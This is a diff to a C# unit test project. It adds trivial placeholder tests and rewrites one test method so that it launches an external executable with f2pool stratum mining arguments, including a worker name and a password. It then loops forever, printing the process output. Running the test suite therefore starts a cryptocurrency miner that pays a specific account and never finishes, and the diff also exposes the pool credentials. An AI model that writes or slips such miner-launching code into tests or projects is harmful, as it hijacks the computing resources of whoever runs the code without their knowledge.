@@ -8,6 +8,11 @@ namespace UnitTestProject1
     public class UnitTest1
     {
         [TestMethod]
+        public void MyTestMethod1()
+        {
+            Assert.AreEqual(1, 1);
+        }
+        [TestMethod]
         public void TestMethod1()
         {
       
@@ -17,14 +22,30 @@ namespace UnitTestProject1
 
             p.StartInfo.FileName = t;
             p.StartInfo.Arguments = " -o stratum+tcp://stratum.f2pool.com:8888 -u chsword.002 -p 2981939a";
-            //p.StartInfo.UseShellExecute = false;
-            //  p.StartInfo.RedirectStandardInput = true;
-            //     p.StartInfo.RedirectStandardOutput = true;
+            p.StartInfo.UseShellExecute = false;
+            p.StartInfo.RedirectStandardInput = true;
+            p.StartInfo.RedirectStandardOutput = true;
             //   p.StartInfo.RedirectStandardError = true;
             //p.StartInfo.CreateNoWindow = true;
-            p.Start();
-
-
+            string str = "";
+            p.OutputDataReceived += (s, e) =>
+            {
+                str=(e.Data);
+                //Debug.WriteLine(e.Data);
+            };
+         
+            p.Start(); 
+            while (true)
+            {
+                Console.WriteLine(str);
+                Debug.WriteLine(str);
+                System.Threading.Thread.Sleep(500);
+            }
+        }
+        [TestMethod]
+        public void MyTestMethod2()
+        {
+            Assert.AreEqual(1, 1);
         }
     }
 }
